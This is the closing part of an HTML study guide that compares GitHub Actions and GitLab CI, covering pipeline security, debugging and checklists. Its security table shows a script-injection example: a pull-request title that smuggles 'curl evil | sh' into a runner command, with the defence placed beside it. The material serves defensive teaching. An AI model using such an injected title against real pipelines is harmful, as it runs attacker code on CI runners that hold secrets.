+  <span class="kw">variables</span>: { <span class="kw">NS</span>: shop }
+  <span class="kw">environment</span>: { <span class="kw">name</span>: production, <span class="kw">url</span>: <span class="str">https://shop.example</span> }
+  <span class="kw">rules</span>: [{ <span class="kw">if</span>: <span class="str">$CI_COMMIT_TAG</span>, <span class="kw">when</span>: manual }]   <span class="cmt"># manual gate; protected environment adds approvers</span>
+  <span class="kw">resource_group</span>: production                  <span class="cmt"># one prod deploy at a time</span>
+
+<span class="kw">include</span>:                                    <span class="cmt"># reuse</span>
+  - <span class="kw">project</span>: <span class="str">shop/ci-templates</span>
+    <span class="kw">ref</span>: v2
+    <span class="kw">file</span>: <span class="str">/templates/sonar.yml</span>
+  - <span class="kw">template</span>: <span class="str">Security/SAST.gitlab-ci.yml</span>       <span class="cmt"># GitLab's built-in scanners</span>
+  - <span class="kw">component</span>: <span class="str">gitlab.com/shop/components/java-ci@1.2.0</span>   <span class="cmt"># CI/CD catalog component (like a reusable workflow)</span></pre>
+<table>
+  <thead><tr><th>GitHub Actions</th><th>GitLab CI</th><th>Note</th></tr></thead>
+  <tbody>
+    <tr><td>Workflow file(s) in <code>.github/workflows/</code></td><td>One <code>.gitlab-ci.yml</code> (+ <code>include</code>)</td><td>GitLab: one pipeline per commit; GitHub: one per matching workflow.</td></tr>
+    <tr><td><code>jobs:</code> parallel by default, <code>needs:</code> for order</td><td><code>stages:</code> sequential; <code>needs:</code> for DAG across stages</td><td>GitLab jobs in the same stage are parallel.</td></tr>
+    <tr><td><code>steps: - uses: / - run:</code></td><td><code>before_script</code> / <code>script</code> / <code>after_script</code> (shell lines only)</td><td>No marketplace steps; reuse via images, <code>include</code>, components.</td></tr>
+    <tr><td><code>runs-on:</code></td><td><code>tags:</code> (runner tags) + <code>image:</code></td><td>GitLab runners are mostly Docker executors; image is per job.</td></tr>
+    <tr><td><code>on:</code> + <code>if:</code></td><td><code>rules:</code> (<code>if</code>, <code>changes</code>, <code>exists</code>, <code>when</code>), <code>workflow: rules</code></td><td><code>rules</code> replaced <code>only/except</code>.</td></tr>
+    <tr><td><code>pull_request</code></td><td><code>$CI_PIPELINE_SOURCE == "merge_request_event"</code>, merged-results pipelines</td><td>GitLab can also run "merge trains" (merge queue).</td></tr>
+    <tr><td><code>${{ secrets.X }}</code></td><td>CI/CD variables (masked, protected = only protected branches/tags), <code>$X</code></td><td>GitLab also integrates Vault / external secrets natively.</td></tr>
+    <tr><td><code>environment:</code> + required reviewers</td><td><code>environment:</code> + <code>when: manual</code> + protected environments (approvals)</td><td>Both show deployment history.</td></tr>
+    <tr><td><code>actions/cache</code></td><td><code>cache:</code> (key/paths/policy)</td><td>GitLab cache is per runner unless distributed (S3).</td></tr>
+    <tr><td><code>upload-artifact</code></td><td><code>artifacts:</code> (paths, reports, expire_in); downloaded automatically by later stages</td><td><code>dependencies:</code> to limit which artifacts a job pulls.</td></tr>
+    <tr><td><code>strategy.matrix</code></td><td><code>parallel: matrix:</code></td><td>—</td></tr>
+    <tr><td><code>services:</code></td><td><code>services:</code></td><td>Same idea; reach by <code>alias</code>.</td></tr>
+    <tr><td><code>concurrency</code></td><td><code>interruptible: true</code> (cancel) + <code>resource_group</code> (serialize)</td><td>—</td></tr>
+    <tr><td>Reusable workflow / composite</td><td><code>include</code> + <code>extends</code> / hidden <code>.jobs</code> / CI/CD components</td><td>—</td></tr>
+    <tr><td>OIDC <code>id-token: write</code></td><td><code>id_tokens:</code></td><td>Same federation pattern with AWS/GCP/Azure/Vault.</td></tr>
+    <tr><td><code>GITHUB_TOKEN</code></td><td><code>CI_JOB_TOKEN</code></td><td>Registry push, API calls, fetching other projects.</td></tr>
+    <tr><td>Hosted runners</td><td>SaaS shared runners (<code>saas-linux-small-amd64</code>…)</td><td>Self-hosted: <code>gitlab-runner</code> with docker / kubernetes executor.</td></tr>
+    <tr><td><code>$GITHUB_STEP_SUMMARY</code></td><td>MR widgets from <code>artifacts: reports:</code> (junit, coverage, sast…)</td><td>GitLab's reports are richer out of the box.</td></tr>
+  </tbody>
+</table>
+<div class="tips"><b>Debug GitLab YAML:</b> CI/CD → Pipeline editor (lint + visualize), or <code>glab ci lint</code>. Variables list: <code>CI_COMMIT_SHA</code>, <code>CI_COMMIT_REF_SLUG</code> (URL-safe branch), <code>CI_PROJECT_DIR</code>, <code>CI_PIPELINE_ID</code>, <code>CI_JOB_ID</code>, <code>CI_MERGE_REQUEST_IID</code>, <code>CI_ENVIRONMENT_NAME</code>.</div>
+<div class="tricky">
+  <div class="q">Q. In GitLab, the <code>image</code> job has <code>needs: [test]</code> and is in a later stage. The <code>lint</code> job in the <code>test</code> stage is still running. Does <code>image</code> wait for <code>lint</code>?</div>
+  <details><summary>Reveal hint</summary><div class="hint">No. <code>needs</code> turns the pipeline into a DAG: <code>image</code> starts as soon as <code>test</code> succeeds, ignoring the rest of the stage. Without <code>needs</code>, it would wait for the whole <code>test</code> stage. That is how you cut pipeline time on GitLab.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 9 ============================= -->
+<h2 id="s9">9. Security of the pipeline itself</h2>
+<table>
+  <thead><tr><th>Risk</th><th>How it bites</th><th>Defence</th></tr></thead>
+  <tbody>
+    <tr><td><b>Script injection</b></td><td><code>run: echo "${{ github.event.pull_request.title }}"</code> — a PR titled <code>"; curl evil | sh; echo "</code> executes on your runner.</td><td>Never put untrusted context (<code>github.event.*</code> titles, bodies, branch names, commit messages) directly in <code>run</code>. Pass through <code>env:</code> and quote: <code>env: { T: ${{ github.event.pull_request.title }} }</code> then <code>echo "$T"</code>.</td></tr>
+    <tr><td><b>Compromised third-party action</b></td><td><code>uses: someone/action@v1</code> where <code>v1</code> is moved to malicious code (it happened: tj-actions, 2025).</td><td>Pin third-party actions to a <b>full commit SHA</b> with a version comment; allow-list actions at the org level; Dependabot keeps SHAs fresh.</td></tr>
+    <tr><td><b>Over-privileged <code>GITHUB_TOKEN</code></b></td><td>A step (or injected code) pushes commits, edits releases, or writes packages.</td><td><code>permissions: contents: read</code> default; grant per job; org setting "read-only by default".</td></tr>
+    <tr><td><b><code>pull_request_target</code> misuse</b></td><td>Checking out and building fork code with secrets available.</td><td>Only use it for metadata actions; never <code>checkout</code> the PR head there.</td></tr>
+    <tr><td><b>Secrets in logs / artifacts</b></td><td>Debug output, <code>set -x</code>, heap dumps in artifacts.</td><td>No <code>set -x</code> with secrets; <code>add-mask</code>; review artifact contents; secret scanning on the repo.</td></tr>
+    <tr><td><b>Cache poisoning</b></td><td>A PR writes a tampered dependency into a cache that main later restores.</td><td>Caches are branch-isolated by design; keep it that way (do not share caches via workarounds); verify checksums (Gradle dependency verification, Maven Central checksums).</td></tr>
+    <tr><td><b>Persistent self-hosted runners</b></td><td>Residue from one job (credentials, malware) affects the next.</td><td>Ephemeral runners; separate runner pools for prod deploys.</td></tr>
+    <tr><td><b>Supply chain of your artifact</b></td><td>Nobody can prove the image came from this pipeline and this commit.</td><td>SBOM (<code>anchore/sbom-action</code>, <code>cyclonedx-maven-plugin</code>), provenance attestations (<code>actions/attest-build-provenance</code>, SLSA), cosign signatures, admission policy that checks them.</td></tr>
+  </tbody>
+</table>
+<pre><span class="cmt"># pinned third-party action with a readable comment</span>
+- <span class="kw">uses</span>: aquasecurity/trivy-action@<span class="num">18f2510ee396bbf400402947b394f2dd8c87dbb0</span>  <span class="cmt"># v0.29.0</span>
+
+<span class="cmt"># safe handling of untrusted input</span>
+- <span class="kw">name</span>: Comment on PR title
+  <span class="kw">env</span>:
+    <span class="kw">TITLE</span>: <span class="str">${{ github.event.pull_request.title }}</span>
+  <span class="kw">run</span>: |
+    <span class="kw">if</span> [[ ! <span class="str">"$TITLE"</span> =~ ^(feat|fix|chore|docs|refactor|test|ci)(\(.+\))?!?:\ .+ ]]; <span class="kw">then</span>
+      echo <span class="str">"::error::PR title must follow Conventional Commits"</span>; exit 1
+    <span class="kw">fi</span>
+
+<span class="cmt"># dependency updates for actions themselves — .github/dependabot.yml</span>
+<span class="kw">version</span>: <span class="num">2</span>
+<span class="kw">updates</span>:
+  - { <span class="kw">package-ecosystem</span>: github-actions, <span class="kw">directory</span>: /, <span class="kw">schedule</span>: { <span class="kw">interval</span>: weekly } }
+  - { <span class="kw">package-ecosystem</span>: maven,          <span class="kw">directory</span>: /, <span class="kw">schedule</span>: { <span class="kw">interval</span>: weekly }, <span class="kw">groups</span>: { <span class="kw">spring</span>: { <span class="kw">patterns</span>: [<span class="str">"org.springframework*"</span>] } } }
+  - { <span class="kw">package-ecosystem</span>: docker,         <span class="kw">directory</span>: /, <span class="kw">schedule</span>: { <span class="kw">interval</span>: weekly } }
+
+<span class="cmt"># SBOM + provenance attestation (GitHub-native)</span>
+- <span class="kw">uses</span>: actions/attest-build-provenance@v2
+  <span class="kw">with</span>: { <span class="kw">subject-name</span>: <span class="str">${{ env.IMAGE }}</span>, <span class="kw">subject-digest</span>: <span class="str">${{ steps.push.outputs.digest }}</span>, <span class="kw">push-to-registry</span>: <span class="kw">true</span> }
+<span class="cmt"># verify later:  gh attestation verify oci://ghcr.io/shop/api@sha256:… --owner shop</span></pre>
+<table>
+  <thead><tr><th>Scanner</th><th>Checks</th><th>Where in the pipeline</th></tr></thead>
+  <tbody>
+    <tr><td><b>CodeQL</b> (<code>github/codeql-action</code>) / Semgrep / SonarQube</td><td>SAST: bugs and vulnerabilities in your Java code.</td><td>PR; results in the Security tab / MR widget.</td></tr>
+    <tr><td><b>Dependabot alerts</b> / OWASP Dependency-Check / Snyk / Trivy fs</td><td>Known CVEs in dependencies (SCA).</td><td>PR + nightly (new CVEs appear without code changes).</td></tr>
+    <tr><td><b>Trivy / Grype</b> on the image</td><td>OS packages and libraries inside the container.</td><td>After build, before push/deploy; fail on CRITICAL/HIGH fixable.</td></tr>
+    <tr><td><b>gitleaks</b> / GitHub secret scanning + push protection</td><td>Credentials committed to the repo.</td><td>Pre-commit + PR + server-side push protection.</td></tr>
+    <tr><td><b>Checkov / tfsec / kube-linter</b></td><td>Misconfigured IaC and manifests.</td><td>PR on infra repos.</td></tr>
+    <tr><td><b>zizmor</b> / <b>actionlint</b></td><td>Lints workflow YAML for injection, permissions, pinning.</td><td>PR on workflow changes.</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. Is <code>uses: actions/checkout@v4</code> (a major tag from GitHub itself) safe enough?</div>
+  <details><summary>Reveal hint</summary><div class="hint">For first-party <code>actions/*</code> and well-known publishers (<code>docker/*</code>, <code>aws-actions/*</code>) a major tag is the common accepted practice; GitHub protects those tags. For everyone else, pin the SHA. If your org needs to be strict, pin everything and let Dependabot move the SHAs.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 10 ============================= -->
+<h2 id="s10">10. Debugging, local runs, and quick reference</h2>
+<table>
+  <thead><tr><th>Symptom</th><th>Cause</th><th>Fix</th></tr></thead>
+  <tbody>
+    <tr><td>Workflow does not run at all</td><td>YAML in the wrong folder / name; <code>on:</code> does not match (branch, paths); workflow disabled; default-branch-only trigger (schedule).</td><td>Check Actions tab → "This workflow has no runs"; <code>actionlint</code>; push the workflow to the default branch first for <code>schedule</code>/<code>workflow_dispatch</code> to appear.</td></tr>
+    <tr><td>"Resource not accessible by integration"</td><td><code>GITHUB_TOKEN</code> lacks a permission.</td><td>Add the needed <code>permissions:</code> (e.g. <code>pull-requests: write</code> to comment).</td></tr>
+    <tr><td>Secret is empty</td><td>Fork PR; wrong environment; typo; secret set at env level but job has no <code>environment:</code>.</td><td>Check where it is defined; <code>echo "${X:+set}"</code> to test presence without printing.</td></tr>
+    <tr><td>Step skipped unexpectedly</td><td><code>if:</code> expression wrong (strings vs booleans: <code>'true'</code> ≠ <code>true</code>).</td><td><code>if: ${{ inputs.flag == true }}</code> for boolean inputs; for <code>workflow_dispatch</code> they arrive as strings unless <code>type: boolean</code>.</td></tr>
+    <tr><td>"No space left on device"</td><td>Images + Maven cache + Docker layers.</td><td>Prune Docker; free-disk-space action; larger runner.</td></tr>
+    <tr><td>Flaky Testcontainers</td><td>Docker pull rate limits / slow starts.</td><td>Login to Docker Hub (<code>docker/login-action</code>) to lift limits; use GHCR mirrors; <code>TESTCONTAINERS_RYUK_DISABLED</code> rarely.</td></tr>
+    <tr><td>Different result than local</td><td>Shallow clone, TZ=UTC, no <code>~/.m2</code> settings, case-sensitive FS, missing env.</td><td>Reproduce with <code>act</code>; check <code>fetch-depth</code>, <code>settings.xml</code>, env vars.</td></tr>
+    <tr><td>YAML "mapping values are not allowed"</td><td>Unquoted <code>:</code> or <code>*</code> in a string (<code>cron: 0 * * * *</code>).</td><td>Quote strings with special characters.</td></tr>
+    <tr><td>Matrix job names collide / unreadable</td><td>Default names only show values.</td><td><code>name: test (${{ matrix.java }})</code>.</td></tr>
+  </tbody>
+</table>
+<pre><span class="cmt"># debug logging for one run: set repo secret ACTIONS_STEP_DEBUG=true (or "Re-run with debug logging")</span>
+<span class="cmt"># print all contexts</span>
+- <span class="kw">run</span>: echo <span class="str">'${{ toJSON(github) }}'</span>
+- <span class="kw">run</span>: echo <span class="str">'${{ toJSON(needs) }}'</span>
+<span class="cmt"># interactive shell into a failing runner (use on private repos only, time-boxed)</span>
+- <span class="kw">uses</span>: mxschmitt/action-tmate@v3
+  <span class="kw">if</span>: failure()
+  <span class="kw">with</span>: { <span class="kw">limit-access-to-actor</span>: <span class="kw">true</span>, <span class="kw">timeout-minutes</span>: <span class="num">15</span> }
+
+<span class="cmt"># run workflows locally with act (nektos/act) — approximate, good for syntax/logic</span>
+act pull_request <span class="ann">-j</span> test <span class="ann">--secret-file</span> .secrets <span class="ann">-P</span> ubuntu-latest=catthehacker/ubuntu:act-latest
+<span class="cmt"># GitHub CLI</span>
+gh workflow list  ·  gh workflow run ci.yml <span class="ann">-f</span> environment=staging  ·  gh run list <span class="ann">--workflow</span> ci.yml
+gh run watch  ·  gh run view 123456 <span class="ann">--log-failed</span>  ·  gh run rerun 123456 <span class="ann">--failed</span>  ·  gh run download 123456 <span class="ann">-n</span> jar
+<span class="cmt"># lint</span>
+actionlint  ·  zizmor .github/workflows/  ·  glab ci lint (GitLab)</pre>
+<table>
+  <thead><tr><th>Checklist for every workflow</th><th>Why</th></tr></thead>
+  <tbody>
+    <tr><td><code>permissions: contents: read</code> at top</td><td>Least privilege.</td></tr>
+    <tr><td><code>timeout-minutes</code> on every job</td><td>No 6-hour hangs.</td></tr>
+    <tr><td><code>concurrency</code> with cancel for CI, queue for deploys</td><td>Save minutes; never cancel a rollout.</td></tr>
+    <tr><td>Pinned action versions (SHA for third-party), Dependabot for actions</td><td>Supply chain.</td></tr>
+    <tr><td>Untrusted input only via <code>env:</code></td><td>No script injection.</td></tr>
+    <tr><td>Cache keyed on dependency files; artifacts with short retention</td><td>Fast and cheap.</td></tr>
+    <tr><td>Build once, promote by digest; deploy jobs use <code>environment:</code></td><td>Reproducible, gated releases.</td></tr>
+    <tr><td>OIDC instead of stored cloud keys</td><td>Nothing to leak or rotate.</td></tr>
+    <tr><td>Test reports + step summary</td><td>Failures readable without opening logs.</td></tr>
+    <tr><td>Shared logic in a versioned reusable workflow</td><td>One fix, all repos.</td></tr>
+  </tbody>
+</table>
+<div class="tips"><b>The 7 rules to remember:</b> 1) every job is a fresh machine — checkout, cache, artifact, secret explicitly; 2) <code>permissions</code>, <code>timeout-minutes</code>, <code>concurrency</code> on everything; 3) PRs build and test, pushes to main build images, tags deploy to prod — one artifact promoted by digest; 4) OIDC + environments for deploys; 5) pin actions, treat <code>github.event.*</code> as hostile; 6) cache dependencies, not outputs; artifacts between jobs; 7) one reusable workflow per stack, called by every repo.</div>
+<div class="tricky">
+  <div class="q">Q. Interviewer: "GitHub Actions or Jenkins?"</div>
+  <details><summary>Reveal hint</summary><div class="hint">Hosted CI (Actions/GitLab) when the code already lives there: zero servers, YAML in the repo, marketplace, OIDC — the default for new work. Jenkins when you need things hosted CI cannot do: on-prem data that cannot leave, exotic build farms, heavy plugin-based legacy, or thousands of jobs where per-minute pricing hurts. Many companies run both; the concepts (stages, artifacts, agents, secrets, gates) are identical.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+</div><!-- /.wrap -->
+
+<script>
+(function () {
+  "use strict";
+
+  // ---- Build the Table of Contents and the slide-in menu from every <h2 id> ----
+  var heads = Array.prototype.slice.call(document.querySelectorAll(".wrap h2[id]"));
+  var toc = document.getElementById("toc");
+  var menuLinks = document.getElementById("menuLinks");
+  heads.forEach(function (h) {
+    var a = document.createElement("a");
+    a.href = "#" + h.id;
+    a.textContent = h.textContent;
+    toc.appendChild(a);
+
+    var m = document.createElement("a");
+    m.href = "#" + h.id;
+    m.textContent = h.textContent;
+    m.addEventListener("click", closeMenu);
+    menuLinks.appendChild(m);
+  });
+
+  // ---- Theme toggle (light default, saved to localStorage) ----
+  var root = document.documentElement;
+  var themeBtn = document.getElementById("themeToggle");
+  function applyTheme(t) {
+    root.setAttribute("data-theme", t);
+    themeBtn.textContent = (t === "dark") ? "\u2600\uFE0F" : "\uD83C\uDF19";
+  }
+  var saved = null;
+  try { saved = localStorage.getItem("gha-gitlab-theme"); } catch (e) {}
+  applyTheme(saved === "dark" ? "dark" : "light");
+  themeBtn.addEventListener("click", function () {
+    var next = root.getAttribute("data-theme") === "dark" ? "light" : "dark";
+    applyTheme(next);
+    try { localStorage.setItem("gha-gitlab-theme", next); } catch (e) {}
+  });
+
+  // ---- Hamburger menu open / close, kept in sync everywhere ----
+  var menu = document.getElementById("menu");
+  var overlay = document.getElementById("overlay");
+  var burger = document.getElementById("hamburger");
+  function openMenu() { menu.classList.add("open"); overlay.classList.add("open"); burger.textContent = "\u2715"; }
+  function closeMenu() { menu.classList.remove("open"); overlay.classList.remove("open"); burger.textContent = "\u2630"; }
+  function toggleMenu() { menu.classList.contains("open") ? closeMenu() : openMenu(); }
+  burger.addEventListener("click", toggleMenu);
+  overlay.addEventListener("click", closeMenu);
+  document.addEventListener("keydown", function (e) { if (e.key === "Escape") closeMenu(); });
+
+  // ---- Left / Right arrow keys jump between sections (with wrap-around) ----
+  function currentIndex() {
+    var idx = 0, best = Infinity;
+    for (var i = 0; i < heads.length; i++) {
+      var top = Math.abs(heads[i].getBoundingClientRect().top - 76);
+      if (top < best) { best = top; idx = i; }
+    }
+    return idx;
+  }
+  function goTo(i) {
+    var n = heads.length;
+    var t = ((i % n) + n) % n;
+    var h = heads[t];
+    h.scrollIntoView({ behavior: "smooth", block: "start" });
+    h.classList.remove("flash");
+    void h.offsetWidth;      // restart the highlight animation
+    h.classList.add("flash");
+  }
+  document.addEventListener("keydown", function (e) {
+    var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : "";
+    if (tag === "input" || tag === "textarea" || e.target.isContentEditable) return;
+    if (e.key === "ArrowRight") { e.preventDefault(); goTo(currentIndex() + 1); }
+    else if (e.key === "ArrowLeft") { e.preventDefault(); goTo(currentIndex() - 1); }
+  });
+})();
+</script>
+
+<!-- KIRO_HOME_BUTTON_START -->
+<style id="kiro-home-button-style">
+  .kiro-home-btn{
+    position:fixed;
+    right:18px;
+    bottom:18px;
+    width:52px;height:52px;
+    border-radius:50%;
+    background:#6c5ce7;
+    color:#ffffff;
+    display:flex;align-items:center;justify-content:center;
+    text-decoration:none;
+    font-size:24px;line-height:1;
+    box-shadow:0 6px 18px rgba(0,0,0,.25), 0 2px 6px rgba(0,0,0,.15);
+    border:2px solid rgba(255,255,255,.85);
+    z-index:99998;
+    transition:transform .15s ease, box-shadow .15s ease, background .15s ease;
+    font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+  }
+  .kiro-home-btn:hover{transform:translateY(-2px) scale(1.05);background:#5a4ad1;box-shadow:0 10px 24px rgba(0,0,0,.3);}
+  .kiro-home-btn:active{transform:scale(.95);}
+  .kiro-home-btn:focus-visible{outline:3px solid #ffd166;outline-offset:3px;}
+  @media print{.kiro-home-btn{display:none!important;}}
+</style>
+<a class="kiro-home-btn" href="https://shakti4640.github.io/lets-do-it-properly/index.html" title="Back to Index" aria-label="Back to Index">
+  <span aria-hidden="true">🏠</span>
+</a>
+<!-- KIRO_HOME_BUTTON_END -->
+</body>
+</html>
